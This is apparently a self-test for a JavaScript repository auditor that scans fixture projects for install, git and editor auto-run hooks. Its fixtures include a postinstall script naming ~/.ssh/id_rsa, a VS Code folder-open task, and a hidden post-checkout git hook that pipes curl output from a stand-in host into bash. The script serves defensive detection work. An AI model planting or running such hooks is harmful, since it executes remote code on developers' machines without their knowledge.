// Self test: builds two tiny fixture projects in a temp folder and checks the audit result.
const { spawnSync } = require("child_process");
const fs = require("fs");
const os = require("os");
const path = require("path");

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "audit-test-"));
const write = (rel, text) => {
  const p = path.join(tmp, rel);
  fs.mkdirSync(path.dirname(p), { recursive: true });
  fs.writeFileSync(p, text);
};

write("clean/package.json", JSON.stringify({ name: "clean", scripts: { test: "node index.js" } }));
write("clean/index.js", 'console.log("hello");\n');
write("bad/package.json", JSON.stringify({ name: "bad", scripts: { postinstall: "node setup.js" } }));
write("bad/setup.js", [
  'const cp = require("child_process");',
  'const payload = Buffer.from("aGVsbG8=", "base64").toString();',
  'const where = "~/.ssh/id_rsa";',
  "console.log(payload, where, typeof cp);",
].join("\n"));

// Repo delivered as a zip with .git included: a real hook, a harmless sample, a risky config line.
write("hooked/package.json", JSON.stringify({ name: "hooked" }));
write("hooked/.git/hooks/post-checkout", "#!/bin/sh\ncurl -sL http://example.invalid/task | bash > /dev/null 2>&1 &\n");
write("hooked/.git/hooks/pre-commit.sample", "#!/bin/sh\nexit 0\n");
write("hooked/.git/config", "[core]\n\tbare = false\n\thooksPath = .githooks\n[alias]\n\tst = status\n");
write("hooked/.vscode/tasks.json", '{"tasks":[{"label":"setup","command":"node x.js","runOptions":{"runOn":"folderOpen"}}]}');
// Normal clone: only sample hooks and a plain config, must stay clean.
write("cloned/package.json", JSON.stringify({ name: "cloned", scripts: { test: "node index.js" } }));
write("cloned/.git/hooks/pre-push.sample", "#!/bin/sh\nexit 0\n");
write("cloned/.git/config", "[core]\n\tbare = false\n[alias]\n\tst = status\n");

const run = (dir) => spawnSync(process.execPath, [path.join(__dirname, "audit.js"), dir], { encoding: "utf8" });
let ok = true;
const check = (name, cond) => { console.log((cond ? "PASS " : "FAIL ") + name); if (!cond) ok = false; };

const clean = run(path.join(tmp, "clean"));
check("clean fixture exits 0", clean.status === 0);
const bad = run(path.join(tmp, "bad"));
check("bad fixture exits 1", bad.status === 1);
check("flags postinstall hook", /postinstall hook runs/.test(bad.stdout));
check("flags shell execution", /runs shell commands/.test(bad.stdout));
check("flags base64 decoding", /decodes base64/.test(bad.stdout));
check("flags key paths", /key, wallet or browser data paths/.test(bad.stdout));
const hooked = run(path.join(tmp, "hooked"));
check("hooked fixture exits 1", hooked.status === 1);
check("flags active git hook", /post-checkout: active git hook/.test(hooked.stdout));
check("flags hook that downloads and runs code", /downloads and runs code/.test(hooked.stdout));
check("ignores .sample hooks", !/pre-commit\.sample/.test(hooked.stdout));
check("flags core.hooksPath", /core\.hooksPath/.test(hooked.stdout));
check("flags VS Code folderOpen task", /folder is opened/.test(hooked.stdout));
check("plain alias is not flagged", !/st = status/.test(hooked.stdout));
const cloned = run(path.join(tmp, "cloned"));
check("normal clone with sample hooks exits 0", cloned.status === 0);
check("missing directory exits 2", run(path.join(tmp, "nope")).status === 2);

fs.rmSync(tmp, { recursive: true, force: true });
process.exit(ok ? 0 : 1);
